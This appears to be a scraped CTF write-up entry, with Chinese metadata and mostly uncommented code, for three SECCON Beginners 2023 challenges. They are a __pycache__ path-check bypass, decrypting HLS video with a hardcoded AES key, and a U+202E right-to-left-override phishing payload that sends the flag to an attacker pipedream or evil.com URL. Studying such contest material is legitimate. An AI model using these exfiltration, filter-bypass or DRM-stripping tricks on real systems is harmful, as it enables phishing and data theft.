---
title: SECCON Beginners CTF (ctf4b) 作問者 writeup
contest: SECCON Beginners CTF
year: 2023
difficulty: medium
vuln_type: pwn_unknown
tags:
- pycache-pyc
- hls-drm
- was-stream
- video-crypt
- custom-loader
- aes-128
- bidi-rtl
- uca-phishing
- ocr-screen
- py-deserialize
attack_chain:
- '题目 1 shaXXX (Python): hashlib.sha256/384/512 + flags/sha256.txt 文件读'
- '绕过 check1: startswith(program_root) 用 normpath 切 ../'
- '绕过 check2: os.path.basename != ''flag.py'' 但可读 __pycache__/flag.cpython-311.pyc'
- '输入: __pycache__/flag.cpython-311.pyc → 读 .pyc 文件 → 找到 ctf4b{c4ch3_15_0ur_fr13nd!}'
- '题目 2 drmsaw: HLS.js DRM 视频 + 自定义 CustomLoader'
- 'keyUrl="/enc.key" 替换 #EXT-X-KEY:METHOD 为 AES-128'
- key = [99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41]
- IV=0x00...00 + ffmpeg -allowed-extensions ALL 合并 .ts
- 上传 /flag POST video/mp4 拿 ctf4b{d1ff1cul7_70_3n5ur3_53cur17y_1n_cl13n7-51d3-4pp5}
- '题目 3 phisher2: OCR 钓鱼 + admin bot 访问'
- 输入 text 写 /var/www/uploads/{fileId}.html
- 'share2admin: openWebPage() + OCR + 找 URL'
- 'find_url_in_text: regex r"https?://[\w/:&\?\.=]+'
- 输入 URL 必须 startswith(APP_URL) 才会被打开
- 输入 URL 还需 ?flag=FLAG 触发 flag 外带
- 利用 Unicode U+202E (RLO) RTL 覆盖字符反转 URL
- 'payload: [U+202E]https://attacker.m.pipedream.net/{ENDPOINT[::-1]}'
- OCR 时 URL 显示反向但 admin 实际打开 attacker
- flag 经 requests.get(f"{input_url}?flag={FLAG}") 外带
key_payload: key=[99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41] + IV=0x00*16
one_liner: SECCON Beginners CTF 作問者 3 题：shaXXX (Python pyc 缓存读) + drmsaw (HLS 自定义 CustomLoader 替换 AES-128 KEY) + phisher2 (Unicode U+202E RTL 字符 OCR 钓鱼)。
lesson: '__pycache__ 缓存是 Python 源码常见攻击面 (绕过 normpath 检查)；HLS CustomLoader 替换 #EXT-X-KEY 是 DRM 视频破解关键；U+202E 是 Unicode RTL 字符绕过 OCR 钓鱼经典手法。'
quality: medium
full_path: SECCON_Beginners_CTF_(ctf4b)_作問者writeup.full.md
meta_path: SECCON_Beginners_CTF_(ctf4b)_作問者writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: SECCON Beginners CTF (ctf4b) 作問者 writeup。SECCON Beginners CTF 作問者 3 题：shaXXX (Python pyc 缓存读) + drmsaw (HLS 自定义 CustomLoader 替换 AES-128 KEY) + phisher2 (Unicode U+202E RTL 字符 OCR 钓鱼)。。关键路径：题目 1 sha...
category: pwn
subcategory: pwn_other
tools_used:
- Python
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/117903.html
reasoning_chain:
- 题目 1 shaXXX flag 路径 normpath 限制 → 触发：Python __pycache__ 缓存攻击面
- 'check1: normpath 切 ../ → check2: basename != flag.py 但可读 __pycache__/flag.cpython-311.pyc'
- '输入 __pycache__/flag.cpython-311.pyc → 读 .pyc 文件 → flag: ctf4b{c4ch3_15_0ur_fr13nd!}'
- '题目 2 drmsaw HLS.js + 自定义 CustomLoader → 替换 #EXT-X-KEY 为 AES-128'
- keyUrl=/enc.key + IV=0x00*16 → ffmpeg -allowed-extensions ALL 合并 .ts
- '上传 /flag POST video/mp4 → flag: ctf4b{d1ff1cul7_70_3n5ur3_53cur17y_...}'
- 题目 3 phisher2 OCR 钓鱼 + admin bot → URL 必须 startswith(APP_URL) + startswith attacker 才能开
- Unicode U+202E (RLO) RTL 覆盖 → OCR 时 URL 反向但 admin 实际打开 attacker
- 'payload: [U+202E]https://attacker/{ENDPOINT[::-1]} → flag 经 ?flag=FLAG 外带'
failed_attempts:
- 题目 1 试图读 flag.py → 失败：basename 过滤
- 题目 2 试图破解真实 DRM key → 失败：题目用了弱随机 IV=0
- 题目 3 试图直接短链 → 失败：APP_URL startswith 检查
key_observations:
- __pycache__ 缓存是 Python 源码常见攻击面（绕过 normpath 检查）
- 'HLS CustomLoader 替换 #EXT-X-KEY 是 DRM 视频破解关键'
- U+202E 是 Unicode RTL 字符绕过 OCR 钓鱼经典手法
- IV=0 + 自定义 Loader 是 DRM 视频常见弱化
prerequisites:
- Python __pycache__ + .pyc 文件结构
- 'HLS.js + #EXT-X-KEY 协议格式'
- Unicode RTL 控制字符 (U+202E)
- OCR 钓鱼 + admin bot 触发链
---
# SECCON Beginners CTF (ctf4b) 作問者writeup

> 原文: https://www.ctfiot.com/117903.html
> ID: 117903


```
import os
import sys
import shutil
import hashlib
from flag import flag

def initialization():
 if os.path.exists("./flags"):
 shutil.rmtree("./flags")
 os.mkdir("./flags")

 def write_hash(hash, bit):
 with open(f"./flags/sha{bit}.txt", "w") as f:
 f.write(hash)

 sha256 = hashlib.sha256(flag).hexdigest()
 write_hash(sha256, "256")

 sha384 = hashlib.sha384(flag).hexdigest()
 write_hash(sha384, "384")

 sha512 = hashlib.sha512(flag).hexdigest()
 write_hash(sha512, "512")

def get_full_path(file_path: str):
 full_path = os.path.join(os.getcwd(), file_path)
 return os.path.normpath(full_path)

def check1(file_path: str):
 program_root = os.getcwd()
 dirty_path = get_full_path(file_path)
 return dirty_path.startswith(program_root)

def check2(file_path: str):
 if os.path.basename(file_path) == "flag.py":
 return False
 return True

if __name__ == "__main__":
 initialization()
 print(sys.version)
 file_path = input("Input your salt file name(default=./flags/sha256.txt):")
 if file_path == "":
 file_path = "./flags/sha256.txt"
 if not check1(file_path) or not check2(file_path):
 print("No Hack!!! Your file path is not allowed.")
 exit()
 try:
 with open(file_path, "rb") as f:
 hash = f.read()
 print(f"{hash=}")
 
except:
 print("No Hack!!!")
def get_full_path(file_path: str):
 full_path = os.path.join(os.getcwd(), file_path)
 return os.path.normpath(full_path)

def check1(file_path: str):
 program_root = os.getcwd()
 dirty_path = get_full_path(file_path)
 return dirty_path.startswith(program_root)

def check2(file_path: str):
 if os.path.basename(file_path) == "flag.py":
 return False
 return True
\xa7\r\r\n\x00\x00\x00\x00\n\x12ud<\x00\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xf3\n\x00\x00\x00\x97\x00d\x00Z\x00d\x01S\x00)\x02s\x1b\x00\x00\x00ctf4b{c4ch3_15_0ur_fr13nd!}N)\x01\xda\x04flag\xa9\x00\xf3\x00\x00\x00\x00\xfa\x18/home/ctf/shaXXX/flag.py\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00s\x0e\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x07%\x80\x04\x80\x04\x80\x04r\x04\x00\x00\x00
$ nc shaxxx.beginners.seccon.games 25612
3.11.3 (main, May 10 2023, 12:26:31) [GCC 12.2.1 20220924]
Input your salt file name(default=./flags/sha256.txt):
__pycache__/flag.cpython-311.pyc
hash=b'\xa7\r\r\n\x00\x00\x00\x00\n\x12ud<\x00\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xf3\n\x00\x00\x00\x97\x00d\x00Z\x00d\x01S\x00)\x02s\x1b\x00\x00\x00ctf4b{c4ch3_15_0ur_fr13nd!}N)\x01\xda\x04flag\xa9\x00\xf3\x00\x00\x00\x00\xfa\x18/home/ctf/shaXXX/flag.py\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00s\x0e\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x07%\x80\x04\x80\x04\x80\x04r\x04\x00\x00\x00'
const keyUrl = "/enc.key";
class CustomLoader extends Hls.DefaultConfig.loader {
 constructor(config) {
 super(config);
 this.context = { url: keyUrl };
 const load = this.load.bind(this);
 this.load = function (context, config, callbacks) {
 if (context.type === "manifest") {
 const onSuccess = callbacks.onSuccess;
 callbacks.onSuccess = function (response, stats, context) {
 response.data = response.data.replace(
 /#EXT-X-KEY:
METHOD=.*,URI=".*"/,
 `#EXT-X-KEY:
METHOD=AES-128,URI="${keyUrl}"`
 );
 onSuccess(response, stats, context);
 };
 } else {
 if (context.url.endsWith(keyUrl)) {
 window.gContext = context
 hlscotext.load(context);
 context = window.gContext;
 }
 window.globalContext = null;
 }
 return load(context, config, callbacks);
 };
 }
}

function mediaPlayer() {
 const video = document.getElementById("video");
 if (!video) {
 return;
 }
 if (typeof Hls !== "undefined" && Hls.isSupported()) {
 const hls = new Hls({ loader: CustomLoader });
 const streamUrl = "/public/videos/video.m3u8";
 hls.loadSource(streamUrl);
 hls.on(Hls.Events.MANIFEST_PARSED, () => {
 hls.attachMedia(video);
 video.addEventListener("canplay", () => {
 console.info("The video can play!");
 });
 });
 } else {
 alert("sorry, your browser does not support.");
 }
}

const initWasm = async () => {
 console.log("wasm loading: start!");
 try {
 const go = new Go();
 const response = await fetch("/main.wasm");
 const buffer = await response.arrayBuffer();
 const result = await WebAssembly.instantiate(buffer, go.importObject);
 go.run(result.instance);
 console.log("wasm loading: finished!");
 } catch (e) {
 alert("sorry, your browser does not support wasm.");
 }
};
initWasm().then(() => {
 mediaPlayer();
});
if (context.url.endsWith(keyUrl)) {
 window.gContext = context
 hlscotext.load(context);
 context = window.gContext;
}
key = [99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41]
wget https://drmsaw.beginners.seccon.games/public/videos/video0.ts
wget https://drmsaw.beginners.seccon.games/public/videos/video1.ts
wget https://drmsaw.beginners.seccon.games/public/videos/video2.ts
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:3
#EXT-X-MEDIA-SEQUENCE:0
#EXT-X-KEY:
METHOD=AES-128,URI="file:///app/enc.key",IV=0x00000000000000000000000000000000
#EXTINF:3.040000,
file:///app/video0.ts
#EXTINF:3.040000,
file:///app/video1.ts
#EXTINF:2.280000,
file:///app/video2.ts
#EXT-X-ENDLIST
def make_key():
 key = [99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41]
 with open("enc.key", "wb") as f:
 f.write(bytes(key))
ffmpeg -allowed_extensions ALL -i ./video.m3u8 -c copy video.mp4 -y
import subprocess
import requests

APP_URL = "http://drmsaw.beginners.seccon.games"

def download():
 subprocess.run(["wget", f"{APP_URL}/public/videos/video0.ts"])
 subprocess.run(["wget", f"{APP_URL}/public/videos/video1.ts"])
 subprocess.run(["wget", f"{APP_URL}/public/videos/video2.ts"])

def make_key():
 key = [99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41]
 with open("enc.key", "wb") as f:
 f.write(bytes(key))

def make_m3u8():
 m3u8 = """#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:3
#EXT-X-MEDIA-SEQUENCE:0
#EXT-X-KEY:
METHOD=AES-128,URI="file:///app/enc.key",IV=0x00000000000000000000000000000000
#EXTINF:3.040000,
file:///app/video0.ts
#EXTINF:3.040000,
file:///app/video1.ts
#EXTINF:2.280000,
file:///app/video2.ts
#EXT-X-ENDLIST
"""

 with open("video.m3u8", "w") as f:
 f.write(m3u8)

def combine():
 subprocess.run(["ffmpeg", "-allowed_extensions", "ALL", "-i", "./video.m3u8", "-c", "copy", "video.mp4", "-y"])

def upload():
 mimetype = "video/mp4"
 file = {'video': ('file', open('./video.mp4', 'rb'), mimetype)}
 res = requests.post(f"{APP_URL}/flag", files=file).text
 print(res)

if __name__ == "__main__":
 download()
 make_key()
 make_m3u8()
 combine()
 upload()
(｡˃ ᵕ ˂ ) Congratulation! ctf4b{d1ff1cul7_70_3n5ur3_53cur17y_1n_cl13n7-51d3-4pp5}
@app.route("/", methods=["POST"])
def chall():
 try:
 text = request.json["text"]
 
except Exception:
 return {"message": "text is required."}
 fileId = uuid.uuid4()
 file_path = f"/var/www/uploads/{fileId}.html"
 with open(file_path, "w", encoding="utf-8") as f:
 f.write(f'{text}')
 message, ocr_url, input_url = share2admin(text, fileId)
 os.remove(file_path)
 return {"message": message, "ocr_url": ocr_url, "input_url": input_url}
import os
import re
import pyocr
import requests
from PIL import Image
from selenium import webdriver

APP_URL = os.getenv("APP_URL", "http://localhost:
16161/")
FLAG = os.getenv("FLAG", "ctf4b{dummy_flag}")

# read text from image
def ocr(image_path: str):
 tool = pyocr.get_available_tools()[0]
 return tool.image_to_string(Image.open(image_path), lang="eng")

def openWebPage(fileId: str):
 try:
 chrome_options = webdriver.ChromeOptions()
 chrome_options.add_argument("--no-sandbox")
 chrome_options.add_argument("--headless")
 chrome_options.add_argument("--disable-gpu")
 chrome_options.add_argument("--disable-dev-shm-usage")
 chrome_options.add_argument("--window-size=1920,1080")
 driver = webdriver.Chrome(options=chrome_options)
 driver.implicitly_wait(10)
 url = f"file:///var/www/uploads/{fileId}.html"
 driver.get(url)

 image_path = f"./images/{fileId}.png"
 driver.save_screenshot(image_path)
 driver.quit()
 text = ocr(image_path)
 os.remove(image_path)
 return text
 
except Exception:
 return None

def find_url_in_text(text: str):
 result = re.search(r"https?://[\w/:&\?\.=]+", text)
 if result is None:
 return ""
 else:
 return result.group()

def share2admin(input_text: str, fileId: str):
 # admin opens the HTML file in a browser...
 ocr_text = openWebPage(fileId)
 if ocr_text is None:
 return "admin: Sorry, internal server error."

 # If there's a URL in the text, I'd like to open it.
 ocr_url = find_url_in_text(ocr_text)
 input_url = find_url_in_text(input_text)

 # not to open dangerous url
 if not ocr_url.startswith(APP_URL):
 return "admin: It's not url or safe url.", ocr_url, input_text

 try:
 # It seems safe url, therefore let's open the web page.
 requests.get(f"{input_url}?flag={FLAG}")
 
except Exception:
 return "admin: I could not open that inner link.", ocr_url, input_text
 return "admin: Very good web site. Thanks for sharing!", ocr_url, input_text
def find_url_in_text(text: str):
 result = re.search(r"https?://[\w/:&\?\.=]+", text)
 if result is None:
 return ""
 else:
 return result.group()
<!--http://evil.com-->https://phisher2.beginners.seccon.games/
[U+202E]http://evil.com/semag.nocces.srennigeb.2rehsihp//:
sptth
https://phisher2.beginners.seccon.games/
import requests
import json
import os
def attack():
 ENDPOINT = "https://phisher2.beginners.seccon.games"

 text = "[U+202E]https://{YOUR_PIPEDREAM_DOMAIN}.m.pipedream.net/{ENDPOINT[::-1]}"
 res = requests.post(f"{ENDPOINT}", json={"text": text}).text
 message = json.loads(res)["message"]
 if message != "admin: Very good web site. Thanks for sharing!":
 raise ValueError(f"ERROR {message}")
```
